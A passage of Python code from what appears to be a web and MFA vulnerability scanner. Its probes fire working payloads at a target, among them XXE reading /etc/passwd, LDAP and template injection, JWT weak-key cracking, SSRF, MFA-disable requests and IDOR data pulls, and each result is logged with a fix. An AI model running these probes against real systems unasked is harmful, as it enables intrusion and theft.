            text = getattr(r, "text", "") or ""
            tokens = list(set(re.findall(
                r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+"
                r"\.[A-Za-z0-9_\-]+", text)))
            if hasattr(r, "cookies"):
                try:
                    for c in r.cookies:
                        tokens.extend(re.findall(
                            r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+"
                            r"\.[A-Za-z0-9_\-]+", c.value))
                except Exception:
                    pass
        self._record("jwt", f"{len(set(tokens))} tokens found")
        for t in list(set(tokens))[:3]:
            PANEL.data("token", t[:80])
        keys = ["secret", "password", "key", "jwt", "changeme",
                "test", "admin", "secretkey", "secret_key",
                "jwtsecret", "jwt_secret", "supersecret",
                "mysecret", "token", "private", "default", "dev",
                "development", "staging", "prod", "production",
                "api", "apikey", "api_key", "auth", "login",
                "verify", "session", "cookie", "signature",
                "sign", "signing", "rsa", "hmac", "hs256",
                "token_key", "bearer", "jwt_token", "auth_key",
                "server", "app", "application", "backend",
                "jwtkey", "access", "refresh", "id_token",
                "access_token", "refresh_token"]
        for tok in list(set(tokens))[:5]:
            for k in keys:
                try:
                    pyjwt.decode(tok, key=k, algorithms=["HS256"])
                    self._record("jwt", f"weak key={k}", True)
                    self.findings.add(
                        title=f"JWT weak key: {k}",
                        severity="critical", category="jwt",
                        endpoint=self.flow.verify_url,
                        description="hs256 weak",
                        evidence={"key": k, "token": tok[:100]},
                        remediation="256-bit random",
                        cwe="CWE-521")
                    PANEL.end_section()
                    return
                except Exception:
                    continue
            try:
                hdr = json.loads(base64.urlsafe_b64decode(
                    tok.split(".")[0] + "=" *
                    ((4 - len(tok.split(".")[0]) % 4) % 4)))
                if hdr.get("alg", "").lower() == "none":
                    self._record("jwt", "alg=none accepted", True)
                    self.findings.add(
                        title="JWT alg=none",
                        severity="critical", category="jwt",
                        endpoint=self.flow.verify_url,
                        description="alg none accepted",
                        evidence={"alg": "none"},
                        remediation="reject none",
                        cwe="CWE-347")
            except Exception:
                pass
        PANEL.end_section()

    def cross_account(self):
        PANEL.section("PROBE  cross-account")
        if not self._need_both("cross-account"):
            PANEL.end_section()
            return
        if not self._need_2acc("cross-account"):
            PANEL.end_section()
            return
        r = self.sess.post(self.flow.request_url,
                           json=self.flow.payload_request or
                           {"account": self.flow.account},
                           timeout=8)
        if r is None:
            self._record("cross-account", "no response")
            PANEL.end_section()
            return
        status = getattr(r, "status_code", 0)
        text = getattr(r, "text", "") or ""
        PANEL.data("request response", f"{status} {text[:120]}")
        code = None
        try:
            j = r.json()
            for k in ("code", "otp", "token"):
                if k in j and str(j[k]).isdigit():
                    code = str(j[k]).zfill(6)
                    break
        except Exception:
            m = re.search(r"\b(\d{6})\b", text)
            if m:
                code = m.group(1)
        if code:
            p = self._verify_payload(code, self.flow.account_2)
            r2 = self.sess.post(self.flow.verify_url, json=p,
                                timeout=8)
            if self._success(r2):
                self._record("cross-account", code, True)
                self.findings.add(
                    title="cross-account reuse",
                    severity="critical", category="cross",
                    endpoint=self.flow.verify_url,
                    description="code A works for B",
                    evidence={"code": code,
                              "from": self.flow.account,
                              "to": self.flow.account_2},
                    remediation="bind to account",
                    cwe="CWE-287")
            else:
                self._record("cross-account", "no reuse")
        else:
            self._record("cross-account",
                         "no 6-digit code in request response")
        PANEL.end_section()

    def cross_flow(self):
        PANEL.section("PROBE  cross-flow")
        if not self._need_verify("cross-flow"):
            PANEL.end_section()
            return
        if not self.flow.reset_url:
            self._skipped("cross-flow", "no reset url")
            PANEL.end_section()
            return
        r = self.sess.post(self.flow.reset_url,
                           json={"account": self.flow.account},
                           timeout=8)
        if r is None:
            self._record("cross-flow", "no response")
            PANEL.end_section()
            return
        status = getattr(r, "status_code", 0)
        text = getattr(r, "text", "") or ""
        PANEL.data("reset response", f"{status} {text[:120]}")
        m = re.search(r"\b(\d{6})\b", text)
        code = m.group(1) if m else None
        if code:
            r2 = self._send(code)
            if self._success(r2):
                self._record("cross-flow", code, True)
                self.findings.add(
                    title="cross-flow reuse",
                    severity="critical", category="cross",
                    endpoint=self.flow.verify_url,
                    description="reset code works on verify",
                    evidence={"code": code},
                    remediation="namespace per flow",
                    cwe="CWE-287")
            else:
                self._record("cross-flow", "no reuse")
        else:
            self._record("cross-flow", "no 6-digit code in reset")
        PANEL.end_section()

    def session_fixation(self):
        PANEL.section("PROBE  session")
        if not self._need_verify("session"):
            PANEL.end_section()
            return
        jar = {"session": "ROSE-SID", "sid": "ROSE-SID",
               "auth": "ROSE-SID", "JSESSIONID": "ROSE-SID",
               "PHPSESSID": "ROSE-SID"}
        payload = self._verify_payload("000000")
        r = self.sess.post(self.flow.verify_url, json=payload,
                           cookies=jar, timeout=8)
        if r is None:
            self._record("session", "no response")
            PANEL.end_section()
            return
        names = []
        if hasattr(r, "cookies"):
            try:
                names = [c.name for c in r.cookies]
            except Exception:
                pass
        PANEL.data("response cookies", ",".join(names) or "none")
        survived = False
        if hasattr(r, "cookies"):
            try:
                survived = any(c.value == "ROSE-SID"
                               for c in r.cookies)
            except Exception:
                pass
        self._record("session",
                     f"survived={survived} cookies={names}",
                     survived)
        if survived:
            self.findings.add(
                title="session fixation",
                severity="high", category="session",
                endpoint=self.flow.verify_url,
                description="attacker sid survived",
                evidence={"cookie": "ROSE-SID", "names": names},
                remediation="regenerate",
                cwe="CWE-384")
        PANEL.end_section()

    def backup_code(self):
        PANEL.section("PROBE  backup")
        if not self._need_verify("backup"):
            PANEL.end_section()
            return
        base = dict(self.flow.payload_verify) or \
            {"account": self.flow.account, "code": "000000"}
        for name, extra in [
            ("type_backup", {"type": "backup"}),
            ("type_recovery", {"type": "recovery"}),
            ("backup_flag", {"backup": True}),
            ("recovery_flag", {"recovery": True}),
            ("is_backup", {"isBackupCode": True}),
            ("mode", {"mode": "backup"}),
        ]:
            payload = {**base, **extra}
            for k in ("code", "otp", "token"):
                if k in payload:
                    payload[k] = "000000-0000"
                    break
            r = self.sess.post(self.flow.verify_url, json=payload,
                               timeout=8)
            if self._success(r):
                self._record("backup", name, True)
                self.findings.add(
                    title=f"backup bypass {name}",
                    severity="critical", category="backup",
                    endpoint=self.flow.verify_url,
                    description=f"{name} bypasses",
                    evidence={"payload": payload,
                              "status": getattr(r, "status_code", 0)},
                    remediation="strict type",
                    cwe="CWE-287")
                break
            self._record("backup",
                         f"{name} -> "
                         f"{getattr(r, 'status_code', 0) if r else '?'}")
        PANEL.end_section()

    def ssrf(self):
        PANEL.section("PROBE  ssrf")
        if not self._need_request("ssrf"):
            PANEL.end_section()
            return
        for field in ["delivery_url", "callback", "webhook_url",
                      "notify_url", "url", "redirect", "return_url"]:
            payload = {**(self.flow.payload_request or
                         {"account": self.flow.account}),
                       field: "http://127.0.0.1:22/"}
            r = self.sess.post(self.flow.request_url, json=payload,
                               timeout=8)
            if r is not None and getattr(r, "status_code", 0) in (
                    200, 201, 202):
                self._record("ssrf", field, True)
                self.findings.add(
                    title=f"SSRF {field}",
                    severity="medium", category="ssrf",
                    endpoint=self.flow.request_url,
                    description=f"{field} accepted internal",
                    evidence={"payload": payload,
                              "status": getattr(r, "status_code", 0)},
                    remediation="allowlist",
                    cwe="CWE-918")
                break
            self._record("ssrf",
                         f"{field} -> "
                         f"{getattr(r, 'status_code', 0) if r else '?'}")
        PANEL.end_section()

    def xff(self):
        PANEL.section("PROBE  xff")
        if not self._need_verify("xff"):
            PANEL.end_section()
            return
        base = self._verify_payload("000000")
        for h in [{"X-Forwarded-For": "127.0.0.1"},
                  {"X-Real-IP": "127.0.0.1"},
                  {"X-Originating-IP": "127.0.0.1"},
                  {"X-Client-IP": "127.0.0.1"},
                  {"X-Remote-IP": "127.0.0.1"},
                  {"Forwarded": "for=127.0.0.1"}]:
            r = self.sess.post(self.flow.verify_url, json=base,
                               headers=h, timeout=8)
            if self._success(r):
                self._record("xff", list(h.keys())[0], True)
                self.findings.add(
                    title=f"xff {list(h.keys())[0]}",
                    severity="high", category="xff",
                    endpoint=self.flow.verify_url,
                    description="xff bypass",
                    evidence={"headers": h,
                              "status": getattr(r, "status_code", 0)},
                    remediation="trust only edge",
                    cwe="CWE-290")
                break
            self._record("xff",
                         f"{list(h.keys())[0]} -> "
                         f"{getattr(r, 'status_code', 0) if r else '?'}")
        PANEL.end_section()

    def cors(self):
        PANEL.section("PROBE  cors")
        origin = "https://roselia.example"
        found = False
        for path, ep in list(self.endpoints.items())[:60]:
            if not path.startswith("/") or ep.noise or \
                    ep.status not in (200, 401, 403):
                continue
            u = self.base_url + path
            r = self.sess.get(u, headers={"Origin": origin},
                              timeout=6)
            if r is None:
                continue
            acao = ""
            acac = ""
            if hasattr(r, "headers"):
                acao = r.headers.get(
                    "Access-Control-Allow-Origin", "")
                acac = r.headers.get(
                    "Access-Control-Allow-Credentials", "")
            if acao == origin:
                found = True
                sev = "critical" if acac.lower() == "true" \
                    else "medium"
                self._record("cors", f"{path} reflects", True)
                self.findings.add(
                    title=f"CORS reflective {path}",
                    severity=sev, category="cors",
                    endpoint=u,
                    description=f"acao reflects {origin}",
                    evidence={"acao": acao, "acac": acac},
                    remediation="allowlist origin",
                    cwe="CWE-942")
                break
            PANEL.data(f"cors {path}",
                       f"acao={acao or 'none'} "
                       f"acac={acac or 'none'}")
        if not found:
            self._record("cors", "no reflect")
        PANEL.end_section()

    def host_header(self):
        PANEL.section("PROBE  host-header")
        if not self.flow.reset_url:
            self._skipped("host-header", "no reset url")
            PANEL.end_section()
            return
        r1 = self.sess.post(self.flow.reset_url,
                            json={"email": "x@y.test"}, timeout=6)
        r2 = self.sess.post(self.flow.reset_url,
                            json={"email": "x@y.test"},
                            headers={"Host": "roselia.example",
                                     "X-Forwarded-Host":
                                     "roselia.example"},
                            timeout=6)
        if r1 is None or r2 is None:
            self._record("host-header", "no response")
            PANEL.end_section()
            return
        s1 = getattr(r1, "status_code", 0)
        s2 = getattr(r2, "status_code", 0)
        t1 = getattr(r1, "text", "") or ""
        t2 = getattr(r2, "text", "") or ""
        diff = s1 == s2 and t1 != t2
        PANEL.data("baseline status", str(s1))
        PANEL.data("injected status", str(s2))
        PANEL.data("baseline len", str(len(t1)))
        PANEL.data("injected len", str(len(t2)))
        self._record("host-header", f"diff={diff}", diff)
        if diff and "roselia.example" in t2:
            self.findings.add(
                title="host header injection",
                severity="high", category="host",
                endpoint=self.flow.reset_url,
                description="response varies by host",
                evidence={"a": t1[:200], "b": t2[:200]},
                remediation="validate host",
                cwe="CWE-644")
        PANEL.end_section()

    def cache_deception(self):
        PANEL.section("PROBE  cache")
        found = False
        for path, ep in list(self.endpoints.items())[:60]:
            if not path.startswith("/") or ep.noise or ep.status != 200:
                continue
            for suffix in [".css", ".js", ".png", ".jpg", ".ico"]:
                u = self.base_url + path + "/x" + suffix
                r = self.sess.get(u, timeout=5)
                if r is None:
                    continue
                status = getattr(r, "status_code", 0)
                ct = ""
                if hasattr(r, "headers"):
                    ct = r.headers.get("Content-Type", "").lower()
                if status == 200 and "css" not in ct and \
                        "javascript" not in ct and "image" not in ct:
                    found = True
                    self._record("cache", path, True)
                    self.findings.add(
                        title=f"cache deception {path}",
                        severity="medium", category="cache",
                        endpoint=u,
                        description=f"{suffix} returns {ct}",
                        evidence={"ct": ct, "status": status},
                        remediation="cache-control no-store",
                        cwe="CWE-525")
                    break
            if found:
                break
        if not found:
            self._record("cache", "no diff")
        PANEL.end_section()

    def cache_poison(self):
        PANEL.section("PROBE  cache-poison")
        targets = ["/", "/index.html", "/robots.txt",
                   "/favicon.ico"]
        found = False
        for path in targets:
            u = self.base_url + path
            marker = "roselia.example"
            r1 = self.sess.get(u, timeout=6)
            if r1 is None or getattr(r1, "status_code", 0) != 200:
                continue
            r2 = self.sess.get(u,
                               headers={"X-Forwarded-Host": marker},
                               timeout=6)
            if r2 is None:
                continue
            r3 = self.sess.get(u, timeout=6)
            if r3 is None:
                continue
            t3 = getattr(r3, "text", "") or ""
            if marker in t3:
                found = True
                self._record("cache-poison", path, True)
                self.findings.add(
                    title=f"Cache poisoning via X-Forwarded-Host "
                          f"on {path}",
                    severity="critical", category="cache",
                    endpoint=u,
                    description="poisoned response served to normal "
                                "requests",
                    evidence={"marker": marker,
                              "poisoned_response": t3[:200]},
                    remediation="include host in cache key",
                    cwe="CWE-525")
                break
        if not found:
            self._record("cache-poison", "no reflect")
        PANEL.end_section()

    def open_redirect(self):
        PANEL.section("PROBE  redirect")
        found = False
        for path, ep in list(self.endpoints.items())[:80]:
            if not path.startswith("/") or ep.noise:
                continue
            if ep.status not in (200, 301, 302, 307, 308) and \
                    not any(k in path.lower() for k in
                            ("redirect", "return", "next", "url",
                             "go", "to")):
                continue
            for p in ["next", "url", "redirect", "return", "to",
                      "goto", "dest"]:
                payload = "https://roselia.example"
                u = self.base_url + path + "?" + \
                    urlencode({p: payload})
                r = self.sess.get(u, timeout=5)
                if r is None:
                    continue
                loc = ""
                if hasattr(r, "headers"):
                    loc = r.headers.get("Location", "")
                if is_real_redirect_to(loc, "roselia.example"):
                    found = True
                    self._record("redirect", f"{path}?{p}", True)
                    self.findings.add(
                        title=f"open redirect {path}?{p}",
                        severity="medium", category="redirect",
                        endpoint=u,
                        description="redirects to attacker",
                        evidence={"loc": loc, "param": p},
                        remediation="allowlist",
                        cwe="CWE-601")
                    break
                elif "roselia.example" in (loc or ""):
                    PANEL.data(f"redirect {path}?{p}",
                               f"SAFE (only query): {loc[:60]}")
                else:
                    PANEL.data(f"redirect {path}?{p}",
                               f"no match ({loc[:40] or 'no loc'})")
            if found:
                break
        if not found:
            self._record("redirect", "no real redirect")
        PANEL.end_section()

    def xxe(self):
        PANEL.section("PROBE  xxe")
        if not self._need_verify("xxe"):
            PANEL.end_section()
            return
        payload = ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e '
                   'SYSTEM "file:///etc/passwd">]><r><code>&e;</code></r>')
        r = self.sess.post(self.flow.verify_url, data=payload,
                           headers={"Content-Type": "application/xml"},
                           timeout=8)
        text = getattr(r, "text", "") if r is not None else ""
        ok = "root:" in text
        status = getattr(r, "status_code", 0) if r is not None else "?"
        self._record("xxe",
                     f"leak={ok} status={status} body={text[:120]}",
                     ok)
        if ok:
            self.findings.add(
                title="XXE", severity="critical", category="xxe",
                endpoint=self.flow.verify_url,
                description="xxe file read",
                evidence={"body": text[:300]},
                remediation="disable entities",
                cwe="CWE-611")
        PANEL.end_section()

    def ldap(self):
        PANEL.section("PROBE  ldap")
        if not self._need_verify("ldap"):
            PANEL.end_section()
            return
        for payload in ["*", "*)(uid=*", "admin)(&(1=1"]:
            p = self._verify_payload("000000")
            for k in list(p.keys()):
                if k in ("account", "email", "username"):
                    p[k] = payload
            r = self.sess.post(self.flow.verify_url, json=p,
                               timeout=8)
            if self._success(r):
                self._record("ldap", payload, True)
                self.findings.add(
                    title="LDAP injection",
                    severity="critical", category="ldap",
                    endpoint=self.flow.verify_url,
                    description="unescaped ldap",
                    evidence={"payload": payload,
                              "status": getattr(r, "status_code", 0)},
                    remediation="escape",
                    cwe="CWE-90")
                break
            self._record("ldap",
                         f"{payload} -> "
                         f"{getattr(r, 'status_code', 0) if r else '?'} "
                         f"{(getattr(r, 'text', '') or '')[:60] if r else ''}")
        PANEL.end_section()

    def ssti(self):
        PANEL.section("PROBE  ssti")
        if not self._need_verify("ssti"):
            PANEL.end_section()
            return
        for payload, marker in [("{{7*7}}", "49"),
                                ("${7*7}", "49"),
                                ("#{7*7}", "49")]:
            p = self._verify_payload("000000")
            for k in list(p.keys()):
                if k in ("account", "email", "username"):
                    p[k] = payload
            r = self.sess.post(self.flow.verify_url, json=p,
                               timeout=8)
            text = getattr(r, "text", "") if r is not None else ""
            if marker in text:
                self._record("ssti", payload, True)
                self.findings.add(
                    title="SSTI", severity="high", category="ssti",
                    endpoint=self.flow.verify_url,
                    description="template eval",
                    evidence={"payload": payload,
                              "body": text[:300]},
                    remediation="sanitize",
                    cwe="CWE-1336")
                break
            self._record("ssti",
                         f"{payload} -> "
                         f"{getattr(r, 'status_code', 0) if r else '?'} "
                         f"{text[:60]}")
        PANEL.end_section()

    def method_fuzz(self):
        PANEL.section("PROBE  method-fuzz")
        if not self._need_verify("method-fuzz"):
            PANEL.end_section()
            return
        for m in ["TRACE", "CONNECT", "PATCH", "PUT", "DELETE"]:
            r = self.sess.request(m, self.flow.verify_url, timeout=6)
            if r is None:
                self._record("method-fuzz", f"{m} -> no response")
                continue
            status = getattr(r, "status_code", 0)
            text = getattr(r, "text", "") or ""
            self._record("method-fuzz",
                         f"{m} -> {status} {text[:60]}")
            if status == 200 and m == "TRACE":
                self.findings.add(
                    title="TRACE enabled",
                    severity="low", category="method",
                    endpoint=self.flow.verify_url,
                    description="trace reflected",
                    evidence={"status": 200,
                              "body": text[:200]},
                    remediation="disable TRACE",
                    cwe="CWE-16")
                break
        PANEL.end_section()

    def method_override(self):
        PANEL.section("PROBE  method-override")
        if not self._need_verify("method-override"):
            PANEL.end_section()
            return
        base = self._verify_payload("000000")
        for hname in ["X-HTTP-Method-Override",
                      "X-HTTP-Method",
                      "X-Method-Override"]:
            for ov in ["GET", "PUT", "DELETE"]:
                h = {hname: ov}
                r = self.sess.post(self.flow.verify_url, json=base,
                                   headers=h, timeout=8)
                if r is None:
                    continue
                status = getattr(r, "status_code", 0)
                text = getattr(r, "text", "") or ""
                if status == 200 and self._success(r):
                    self._record("method-override",
                                 f"{hname}={ov} success", True)
                    self.findings.add(
                        title=f"method override {hname}={ov}",
                        severity="medium", category="method",
                        endpoint=self.flow.verify_url,
                        description="override header honored",
                        evidence={"header": hname, "value": ov},
                        remediation="ignore override headers",
                        cwe="CWE-288")
                    PANEL.end_section()
                    return
                self._record("method-override",
                             f"{hname}={ov} -> {status}")
        PANEL.end_section()

    def h2c_probe(self):
        PANEL.section("PROBE  h2c")
        base = urlparse(self.base_url)
        if not base.hostname:
            PANEL.end_section()
            return
        try:
            import socket
            s = socket.create_connection((base.hostname, 80),
                                          timeout=5)
            s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
            data = s.recv(64)
            s.close()
            if b"HTTP/2" in data or b"h2c" in data.lower():
                self._record("h2c", "upgrade accepted", True)
                self.findings.add(
                    title="HTTP/2 cleartext upgrade",
                    severity="medium", category="protocol",
                    endpoint=self.base_url,
                    description="h2c upgrade accepted on port 80",
                    evidence={"first_bytes": data[:30].hex()},
                    remediation="disable h2c on edge",
                    cwe="CWE-16")
            else:
                self._record("h2c", "no upgrade")
        except Exception:
            self._record("h2c", "connect failed")
        PANEL.end_section()

    def jsonp_probe(self):
        PANEL.section("PROBE  jsonp")
        if not self._need_verify("jsonp"):
            PANEL.end_section()
            return
        for path in [self.flow.verify_url]:
            for cb in ["test_cb", "jsonp", "jQuery123"]:
                u = path + "?" + urlencode({"callback": cb})
                r = self.sess.get(u, timeout=6)
                if r is None:
                    continue
                text = getattr(r, "text", "") or ""
                if re.match(rf"^\s*{cb}\s*\(", text):
                    self._record("jsonp", path, True)
                    self.findings.add(
                        title=f"JSONP endpoint {path}",
                        severity="medium", category="jsonp",
                        endpoint=u,
                        description="endpoint wraps response in "
                                    "callback (CORS bypass)",
                        evidence={"cb": cb, "body": text[:200]},
                        remediation="remove JSONP or validate "
                                    "Referer",
                        cwe="CWE-346")
                    PANEL.end_section()
                    return
        self._record("jsonp", "no jsonp")
        PANEL.end_section()

    def auth_header_bypass(self):
        PANEL.section("PROBE  auth-header")
        if not self._need_verify("auth-header"):
            PANEL.end_section()
            return
        base = self._verify_payload("000000")
        for h in [{"X-Internal": "true"},
                  {"X-Debug": "true"},
                  {"X-Original-IP": "127.0.0.1"},
                  {"Authorization": "Bearer null"},
                  {"User-Agent": "internal-service"}]:
            r = self.sess.post(self.flow.verify_url, json=base,
                               headers=h, timeout=8)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            if self._success(r):
                self._record("auth-header", list(h.keys())[0], True)
                self.findings.add(
                    title=f"auth bypass {list(h.keys())[0]}",
                    severity="high", category="auth",
                    endpoint=self.flow.verify_url,
                    description="header bypass accepted",
                    evidence={"headers": h, "status": status},
                    remediation="remove trusted-internal headers",
                    cwe="CWE-290")
                break
            self._record("auth-header",
                         f"{list(h.keys())[0]} -> {status}")
        PANEL.end_section()

    def url_rewrite_bypass(self):
        PANEL.section("PROBE  url-rewrite")
        base = self._verify_payload("000000")
        for h in [{"X-Original-URL": "/api/v2/otp/verify"},
                  {"X-Rewrite-URL": "/api/v2/otp/verify"},
                  {"X-Forwarded-Prefix": "/api"},
                  {"X-Original-Path": "/api/v2/otp/verify"}]:
            r = self.sess.request("GET", self.base_url,
                                  headers=h, timeout=6)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            text = getattr(r, "text", "") or ""
            if status == 200 and "missing data" in text.lower():
                self._record("url-rewrite", list(h.keys())[0], True)
                self.findings.add(
                    title=f"path bypass via {list(h.keys())[0]}",
                    severity="medium", category="waf",
                    endpoint=self.base_url,
                    description="rewrite header reaches protected path",
                    evidence={"header": h},
                    remediation="strip rewrite headers at edge",
                    cwe="CWE-288")
                break
            self._record("url-rewrite",
                         f"{list(h.keys())[0]} -> {status}")
        PANEL.end_section()

    def csrf_mfa(self):
        PANEL.section("PROBE  csrf-mfa")
        found = False
        for path in ["/api/mfa/disable", "/api/mfa/reset",
                     "/api/auth/mfa/disable", "/api/settings/mfa",
                     "/account/mfa/disable", "/api/2fa/disable",
                     "/api/v1/mfa/disable", "/api/v1/2fa/disable"]:
            u = self.base_url + path
            r = self.sess.post(u, json={}, timeout=6)
            status = getattr(r, "status_code", 0) if r else "?"
            text = getattr(r, "text", "") or ""
            ok = r is not None and status in (200, 204, 302) and \
                not is_auth_page(text)
            self._record("csrf-mfa", f"{path} -> {status}", ok)
            if ok:
                found = True
                self.findings.add(
                    title=f"csrf mfa {path}",
                    severity="high", category="csrf",
                    endpoint=u,
                    description="no csrf token",
                    evidence={"status": status, "body": text[:200]},
                    remediation="csrf + re-auth",
                    cwe="CWE-352")
                break
        if not found:
            self._record("csrf-mfa", "none vulnerable")
        PANEL.end_section()

    def mfa_downgrade(self):
        PANEL.section("PROBE  downgrade")
        if not self._need_verify("downgrade"):
            PANEL.end_section()
            return
        base_path = urlparse(self.flow.verify_url).path
        base = base_path.rsplit("/", 1)[0]
        for p in [f"{base}/v1/verify", f"{base}/v2/verify",
                  "/v1/otp/verify", "/v2/otp/verify",
                  "/api/v1/auth/verify", "/api/v2/auth/verify"]:
            u = self.base_url + p
            r = self.sess.post(u, json={"code": "000000"},
                               timeout=6)
            status = getattr(r, "status_code", 0) if r else "?"
            text = getattr(r, "text", "") or ""
            ok = r is not None and status == 200 and \
                not is_auth_page(text) and not is_cf_block(r)
            self._record("downgrade", f"{p} -> {status}", ok)
            if ok:
                self.findings.add(
                    title=f"alt verify {p}",
                    severity="medium", category="downgrade",
                    endpoint=u,
                    description="deprecated reachable",
                    evidence={"status": 200, "body": text[:200]},
                    remediation="remove deprecated")
                break
        PANEL.end_section()

    def graphql_introspect(self):
        PANEL.section("PROBE  graphql")
        for path in ["/graphql", "/api/graphql", "/gql"]:
            u = self.base_url + path
            q = {"query": "{__schema{types{name}}}"}
            r = self.sess.post(u, json=q, timeout=6)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            text = getattr(r, "text", "") or ""
            if status == 200 and "__schema" in text:
                self._record("graphql", path, True)
                self.findings.add(
                    title=f"GraphQL introspection on {path}",
                    severity="medium", category="graphql",
                    endpoint=u,
                    description="full schema exposed",
                    evidence={"body": text[:300]},
                    remediation="disable introspection in prod",
                    cwe="CWE-200")
                break
            self._record("graphql", f"{path} -> {status}")
        PANEL.end_section()

    def id_enum(self):
        PANEL.section("PROBE  id-enum")
        user_paths = ["/api/users/1", "/api/users/2",
                      "/api/users/0", "/api/users/admin",
                      "/api/user/1", "/api/account/1"]
        found = False
        for p in user_paths:
            u = self.base_url + p
            r = self.sess.get(u, timeout=5)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            text = getattr(r, "text", "") or ""
            if status == 200 and len(text) > 20 and \
                    not is_auth_page(text):
                pii = extract_pii(text)
                if pii:
                    self._record("id-enum", p, True)
                    self.findings.add(
                        title=f"IDOR {p}",
                        severity="critical", category="idor",
                        endpoint=u,
                        description="sequential ID exposes user data",
                        evidence={"pii": pii[:3],
                                  "body": text[:200]},
                        remediation="authorize per object",
                        cwe="CWE-639")
                    found = True
                    break
                self._record("id-enum", f"{p} -> 200 (no pii)")
        if not found:
            self._record("id-enum", "no idor")
        PANEL.end_section()

    def mass_assignment(self):
        PANEL.section("PROBE  mass-assignment")
        if not self._need_verify("mass-assignment"):
            PANEL.end_section()
            return
        base = dict(self.flow.payload_verify) or \
            {"account": self.flow.account, "code": "000000"}
        for name, extra in [
            ("is_admin", {"is_admin": True}),
            ("admin", {"admin": True}),
            ("verified", {"verified": True}),
            ("role", {"role": "admin"}),
            ("permissions", {"permissions": ["admin"]}),
            ("user_id", {"user_id": 1}),
        ]:
            payload = {**base, **extra}
            r = self.sess.post(self.flow.verify_url, json=payload,
                               timeout=8)
            if self._success(r):
                self._record("mass-assignment", name, True)
                self.findings.add(
                    title=f"mass assignment: {name}",
                    severity="high", category="mass",
                    endpoint=self.flow.verify_url,
                    description=f"{name} accepted",
                    evidence={"payload": payload,
                              "status": getattr(r, "status_code", 0)},
                    remediation="whitelist fields",
                    cwe="CWE-915")
                break
            self._record("mass-assignment",
                         f"{name} -> "
                         f"{getattr(r, 'status_code', 0) if r else '?'}")
        PANEL.end_section()

    def param_pollution_url(self):
        PANEL.section("PROBE  param-pollution")
        if not self._need_verify("param-pollution"):
            PANEL.end_section()
            return
        tests = [
            ("account=x&account=y&code=000000",
             {"account": "x"}),
            ("account[]=x&code=000000",
             {"account[]": "x"}),
            ("account[x]=y&code=000000",
             {"account[x]": "y"}),
            ("account=%00&code=000000",
             {"account": "%00"}),
        ]
        for body, _ in tests:
            r = self.sess.post(self.flow.verify_url, data=body,
                               headers={"Content-Type":
                                        "application/x-www-form-"
                                        "urlencoded"},
                               timeout=8)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            text = getattr(r, "text", "") or ""
            if self._success(r) and not is_auth_page(text):
                self._record("param-pollution", body[:40], True)
                self.findings.add(
                    title="URL parameter pollution accepted",
                    severity="medium", category="pp",
                    endpoint=self.flow.verify_url,
                    description="duplicate array params accepted",
                    evidence={"body": body},
                    remediation="reject duplicates",
                    cwe="CWE-88")
                break
            self._record("param-pollution", f"{status}")
        PANEL.end_section()

    def response_manip(self):
        PANEL.section("PROBE  response-manip")
        for h in [{"X-Original-Status": "200"},
                  {"X-Forwarded-Status": "200"},
                  {"X-Override-Status": "200"}]:
            r = self.sess.get(self.base_url + "/nonexistent-" +
                              str(random.randint(1000, 9999)),
                              headers=h, timeout=5)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            if status == 200:
                self._record("response-manip",
                             f"{list(h.keys())[0]} -> 200", True)
                self.findings.add(
                    title=f"status override via "
                          f"{list(h.keys())[0]}",
                    severity="low", category="protocol",
                    endpoint=self.base_url,
                    description="override header changes status",
                    evidence={"header": h, "status": status},
                    remediation="ignore override headers",
                    cwe="CWE-16")
                break
            self._record("response-manip",
                         f"{list(h.keys())[0]} -> {status}")
        PANEL.end_section()

    def subdomain_takeover(self):
        PANEL.section("PROBE  takeover")
        hostname = urlparse(self.base_url).hostname
        if not hostname:
            self._skipped("takeover", "no host")
            PANEL.end_section()
            return
        base = ".".join(hostname.split(".")[-2:]) \
            if "." in hostname else hostname
        providers = {
            "s3.amazonaws.com": "NoSuchBucket",
            "herokudns.com": "No such app",
            "github.io": "There isn't a GitHub Pages site here",
            "azurewebsites.net": "Error 404 - Web app not found",
            "cloudfront.net": "Bad request",
            "fastly.net": "Fastly error: unknown domain",
            "bitbucket.io": "Repository not found",
            "surge.sh": "project not found",
            "netlify.app": "Not Found - Request ID",
            "ghost.io": "Domain error",
            "readthedocs.io": "unknown to Read the Docs",
            "pages.dev": "Project not found",
        }
        subs = ["www", "api", "auth", "login", "sso", "id", "mfa",
                "admin", "test", "staging", "dev", "app", "beta",
                "mail", "blog", "docs", "support", "status",
                "cdn", "static", "assets", "media", "files"]
        hits = 0
        for sub in subs:
            host = f"{sub}.{base}"
            r = self.sess.get(f"https://{host}", timeout=6)
            if r is None:
                continue
            text = (getattr(r, "text", "") or "").lower()
            status = getattr(r, "status_code", 0)
            matched = None
            for provider, sig in providers.items():
                if sig.lower() in text:
                    matched = provider
                    break
            if matched:
                hits += 1
                self._record("takeover", f"{host} -> {matched}",
                             True)
                self.findings.add(
                    title=f"takeover {host}",
                    severity="high", category="takeover",
                    endpoint=f"https://{host}",
                    description=f"points to {matched}",
                    evidence={"provider": matched,
                              "snippet": text[:200]},
                    remediation="remove dns",
                    cwe="CWE-350")
            else:
                PANEL.data(f"takeover {host}",
                           f"{status} {text[:40]}")
        if not hits:
            self._record("takeover", "no matches")
        PANEL.end_section()


class Evidence:
    def __init__(self, key):
        self.key = key
        self.items = []

    def add(self, kind, payload):
        canonical = json.dumps(payload, sort_keys=True,
                               default=str).encode()
        sig = hmac.new(self.key.encode(), canonical,
                       hashlib.sha256).hexdigest()
        self.items.append({"kind": kind, "ts": now_utc(),
                           "payload": payload, "hmac": sig})

    def merkle_root(self):
        hs = [bytes.fromhex(i["hmac"]) for i in self.items]
        if not hs:
            return sha256_of("")
        while len(hs) > 1:
            nxt = []
            for i in range(0, len(hs), 2):
                a = hs[i]
                b = hs[i + 1] if i + 1 < len(hs) else a
                nxt.append(hashlib.sha256(a + b).digest())
            hs = nxt
        return hs[0].hex()

    def export(self, path):
        doc = {"generated": now_utc(),
               "merkle_root": self.merkle_root(),
